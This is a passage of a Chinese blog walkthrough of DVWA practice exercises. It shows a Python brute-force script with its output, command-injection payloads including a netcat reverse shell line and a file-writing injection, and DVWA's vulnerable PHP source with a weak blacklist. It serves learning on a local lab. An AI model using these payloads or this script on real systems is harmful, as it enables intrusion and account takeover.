height="208"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170044746"
class="gallery-image"
data-flex-grow="140"
data-flex-basis="338px"
>&lt;/p>
&lt;p>出于基本的好奇和联想（不要联想）试了下&lt;code>admin&lt;/code>和&lt;code>password&lt;/code>（就是DVWA默认的登陆密码），发现这就是正确密码了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718.png"
width="349"
height="273"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170146718"
class="gallery-image"
data-flex-grow="127"
data-flex-basis="306px"
>&lt;/p>
&lt;p>好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。&lt;/p>
&lt;p>出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288.png"
width="431"
height="198"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170531288"
class="gallery-image"
data-flex-grow="217"
data-flex-basis="522px"
>&lt;/p>
&lt;p>再看下网络请求。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287.png"
width="1393"
height="469"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170720287"
class="gallery-image"
data-flex-grow="297"
data-flex-basis="712px"
>&lt;/p>
&lt;p>用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。&lt;/p>
&lt;h3 id="准备">准备&lt;/h3>
&lt;p>暴力破解也有暴力破解的技巧。&lt;/p>
&lt;p>可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。&lt;/p>
&lt;p>但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。&lt;/p>
&lt;p>这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。&lt;/p>
&lt;p>挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个&lt;a class="link" href="https://github.com/TgeaUs/Weak-password/" target="_blank" rel="noopener"
>Weak-password&lt;/a>（里面大部分内容不关心也用不到）直接下载 zip。&lt;/p>
&lt;p>创建个 &lt;code>dvwa-writeup&lt;/code> 仓库用来存 dvwa 题解脚本，把 zip 解压进去。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142.png"
width="291"
height="359"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422092243142"
class="gallery-image"
data-flex-grow="81"
data-flex-basis="194px"
>&lt;/p>
&lt;p>就是这样。&lt;/p>
&lt;h3 id="编写脚本">编写脚本&lt;/h3>
&lt;p>出于个人偏好，使用 python 编写脚本。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="ch">#!/usr/bin/env python3&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># WriteUp: brute force [Security Level: Low]&lt;/span>
&lt;span class="c1"># Author: weak_ptr&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># NOTE: require python version &amp;gt;= 3.6&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;span class="n">dictionary_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="s1">&amp;#39;Weak-password/Password dictionary/常用密码.dict&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;Weak-password/Password dictionary/国外常用密码.dict&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">]&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">path&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">dictionary_list&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[+] open dict: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">pwd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;http://localhost:8080/vulnerabilities/brute/?username=admin&amp;amp;password=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;amp;Login=Login#&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;t6kml64lvsbd8909fkrh51ove0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;security&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;low&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="c1"># 太粗暴&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[-] try password: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;Username and/or password incorrect.&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[+] Done! password is &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">repr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">continue&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行后：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">[+] open dict: Weak-password/Password dictionary/常用密码.dict
[-] try password: admin
[-] try password: admin12
[-] try password: admin888
[-] try password: admin8
[-] try password: admin123
[-] try password: sysadmin
[-] try password: adminxxx
[-] try password: adminx
[-] try password: 6kadmin
[-] try password: base
[-] try password: feitium
[-] try password: admins
[-] try password: root
[-] try password: roots
[-] try password: test
[-] try password: test1
[-] try password: test123
[-] try password: test2
[-] try password: password
[+] Done! password is &amp;#39;password&amp;#39;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>值得注意的是不清楚是不是因为我跑在容器里而且虚拟机只分配了 2C 1G 的缘故，每次尝试密码耗时都接近 1s。放在真实场景下，服务端如果限制了请求频率（或者把每个请求都用固定时间返回，如 1s），破解成本会骤然提高（不过对服务器来说固定返回时间也是有不低的成本的）。&lt;/p>
&lt;h3 id="提高难度">提高难度&lt;/h3>
&lt;p>尝试把安全等级提高到 Medium 和 High 对暴力破解并没有什么用，不清楚是不是因为虚拟机太慢，单线程爆破没触发频率限制。但总之是和 Low 难度下没什么区别。&lt;/p>
&lt;p>提高到 Impossible ，开启 PHPIDS 也无济于事。&lt;/p>
&lt;p>可见系统设计再安全也顶不住人为因素，保险箱钥匙放在地毯下面的时候就算保险箱是振金做的也防不住贼啊。&lt;/p>
&lt;h2 id="command-injection">Command Injection&lt;/h2>
&lt;h3 id="信息收集-1">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288.png"
width="690"
height="270"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101128288"
class="gallery-image"
data-flex-grow="255"
data-flex-basis="613px"
>&lt;/p>
&lt;p>介绍是 ping a device，尝试输入 localhost 提交：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860.png"
width="669"
height="389"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101215860"
class="gallery-image"
data-flex-grow="171"
data-flex-basis="412px"
>&lt;/p>
&lt;p>应该是执行了 &lt;code>ping -c 4 &amp;lt;用户输入&amp;gt;&lt;/code>。尝试随便输入什么东西会不会报错。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634.png"
width="673"
height="263"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101354634"
class="gallery-image"
data-flex-grow="255"
data-flex-basis="614px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231.png"
width="689"
height="283"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101405231"
class="gallery-image"
data-flex-grow="243"
data-flex-basis="584px"
>&lt;/p>
&lt;p>立刻返回了，什么也没发生。再尝试拼一个命令进去：&lt;code>localhost &amp;amp;&amp;amp; echo 123&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861.png"
width="679"
height="411"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101538861"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="396px"
>&lt;/p>
&lt;p>注意到末尾输出了 123，说明存在命令执行。&lt;/p>
&lt;h3 id="准备-1">准备&lt;/h3>
&lt;p>能执行任意命令的话，悬念就不大了，进可攻退可守。&lt;/p>
&lt;p>对 &lt;code>/var/www/html&lt;/code> 有写权限的话可以直接写个一句话木马，或者通过 &lt;code>nc&lt;/code> 命令反弹 shell。&lt;/p>
&lt;p>顺便一体 nc 反弹 shell 我并不会（手动狗头）。所以还得先学一学怎么用 nc 反弹 shell，到底啥原理。&lt;/p>
&lt;p>先 &lt;code>man nc&lt;/code> 看看手册。&lt;/p>
&lt;blockquote>
&lt;p>NAME&lt;/p>
&lt;p>​ nc - TCP/IP swiss army knife&lt;/p>
&lt;p>SYNOPSIS&lt;/p>
&lt;p>​ nc [-options] hostname port[s] [ports] &amp;hellip;&lt;/p>
&lt;p>​ nc -l -p port [-options] [hostname] [port]&lt;/p>
&lt;/blockquote>
&lt;p>嘶&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>TCP/IP 瑞士军刀诶。&lt;/p>
&lt;blockquote>
&lt;p>netcat is a simple unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable &amp;ldquo;back-end&amp;rdquo; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or &amp;ldquo;nc&amp;rdquo; as the actual program is named, should have been supplied long ago as another one of those cryptic but standard Unix tools.&lt;/p>
&lt;/blockquote>
&lt;p>netcat（我就管它叫网猫了），看介绍是一个可以被其他程序或者脚本驱动的“后端”工具，也是网络调试和探索工具，能创建几乎所有类型的连接。这么说感觉还有点迷惑，看后文介绍就清楚多了。&lt;/p>
&lt;blockquote>
&lt;p>In the simplest usage, &amp;ldquo;nc host port&amp;rdquo; creates a TCP connection to the given port on the given target host. Your standard input is then sent to the host, and anything that comes back across the connection is sent to your standard output. This continues indefinitely, until the network side of the connection shuts down. Note that this behavior is different from most other applications which shut everything down and exit after an end-of-file on the standard input.&lt;/p>
&lt;p>Netcat can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing. With minor limitations, netcat doesn&amp;rsquo;t really care if it runs in &amp;ldquo;client&amp;rdquo; or &amp;ldquo;server&amp;rdquo; mode &amp;ndash; it still shovels data back and forth until there isn&amp;rsquo;t any more left. In either mode, shutdown can be forced after a configurable time of inactivity on the network side.&lt;/p>
&lt;/blockquote>
&lt;p>概括下值得关注的部分，就是网猫的两种工作模式。客户端模式下把 stdin 用连接转发，同时把收到的消息写到 stdout；服务器模式监听端口，同样转发 stdin 并把收到的消息写到 stdout 。&lt;/p>
&lt;p>剩下比较重要的就是几个命令行选项：&lt;/p>
&lt;ul>
&lt;li>&lt;code>-l&lt;/code> 指示网猫在服务器模式下工作，监听一个指定端口。&lt;/li>
&lt;li>&lt;code>-e&lt;/code> 指示网猫在连接后运行一个程序，程序的输入会变成从连接收到的信息，程序的输出会从连接发送出去。&lt;/li>
&lt;li>&lt;code>-s&lt;/code> 指示网猫监听的本地地址。&lt;/li>
&lt;/ul>
&lt;p>可以做个简单的实验熟悉下命令的使用，用 tmux 按 &lt;code>ctrl+b&lt;/code> &lt;code>&amp;quot;&lt;/code> &lt;code>ctrl+b&lt;/code> &lt;code>%&lt;/code> 切分两个窗口出来，一边执行 &lt;code>nc -l -s 0.0.0.0 -p 12345&lt;/code> 另一边执行 &lt;code>nc localhost 12345&lt;/code>。&lt;/p>
&lt;p>在执行 &lt;code>nc localhost 12345&lt;/code> 的这边网猫工作在客户端模式下，可以自由尝试在两边键盘输入什么东西，另一边都会实时回显：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970.png"
width="1253"
height="110"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422134806970"
class="gallery-image"
data-flex-grow="1139"
data-flex-basis="2733px"
>&lt;/p>
&lt;p>现在解释网猫反向shell就很简单了，用 &lt;code>nc localhost 12345 -e /bin/sh&lt;/code> 连接服务器，此时 &lt;code>/bin/sh&lt;/code> 的输入输出被接管，我们在服务端输入 &lt;code>ls&lt;/code>，客户端的 &lt;code>/bin/sh&lt;/code> 读到的输入就是 &lt;code>ls&lt;/code>，&lt;code>/bin/sh&lt;/code> 执行 &lt;code>ls&lt;/code> 的结果又返回到服务端——&lt;code>nc&lt;/code>客户端就成了一个类似sshd的角色，故称反向连接。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963.png"
width="799"
height="204"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422135301963"
class="gallery-image"
data-flex-grow="391"
data-flex-basis="940px"
>&lt;/p>
&lt;h3 id="构造-payload">构造 payload&lt;/h3>
&lt;p>先尝试用网猫反向连接。输入内容改成 &lt;code>localhost &amp;amp;&amp;amp; nc &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; -e /bin/sh &amp;amp;&lt;/code> ，等待连接。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026.png"
width="341"
height="41"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422135847026"
class="gallery-image"
data-flex-grow="831"
data-flex-basis="1996px"
>&lt;/p>
&lt;p>没成功。网页显示 ping 命令的输出，看了眼 dvwa 容器的日志发现提示没有&lt;code>nc&lt;/code>命令。&lt;/p>
&lt;p>好吧，上面那么多话到最后还是没有屁用。那就改成提交一个 php 一句话。输入内容改为 &lt;code>localhost &amp;amp;&amp;amp; echo '&amp;lt;?php phpinfo(); ?&amp;gt;' &amp;gt; /var/www/html/1.php&lt;/code>，然后访问 &lt;code>http://localhost:8080/1.php&lt;/code>，发现成功显示 phpinfo，done。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861.png"
width="1248"
height="366"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422140459588"
class="gallery-image"
data-flex-grow="340"
data-flex-basis="818px"
>&lt;/p>
&lt;h3 id="提高难度medium">提高难度：Medium&lt;/h3>
&lt;p>在 Medium 难度下 直接注入 &lt;code>localhost &amp;amp;&amp;amp; echo 123&lt;/code> 会发现没有 &lt;code>123&lt;/code> 回显了，日志里出现 &lt;code>ping: unknown host&lt;/code> 的错误，初步怀疑是对 &lt;code>&amp;amp;&amp;amp;&lt;/code> 做了过滤。&lt;/p>
&lt;p>DVWA 是个白盒，我也不用瞎试，直接点开 view source 审计下代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Determine OS and execute the ping command.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stristr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">php_uname&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s1">&amp;#39;Windows NT&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Windows
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// *nix
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Feedback for the end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到把 &lt;code>&amp;amp;&amp;amp;&lt;/code> 和 &lt;code>;&lt;/code> 去除了，但这个过滤显然是不完善的。起码我一下子就能想到还可以&lt;code>||&lt;/code>或者&lt;code>|&lt;/code>，还有&lt;code>$()&lt;/code>之类的方式。&lt;/p>
&lt;p>把先前的 payload 改成 &lt;code>notexists || echo 123&lt;/code> 再提交。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236.png"
width="674"
height="140"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422153010236"
class="gallery-image"
data-flex-grow="481"
data-flex-basis="1155px"
>&lt;/p>
&lt;p>可以看到 &lt;code>echo 123&lt;/code> 已经被执行了，剩下的就是 get shell 了。&lt;/p>
&lt;h3 id="提高难度high">提高难度：High&lt;/h3>
&lt;p>High 难度下用 Medium 难度的 Payload 也能直接 bypass，有点意外。虽然已经过了，但还是再审计下 High 难度下的代码，看看和 Medium 难度有什么不同。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">]);&lt;/span>
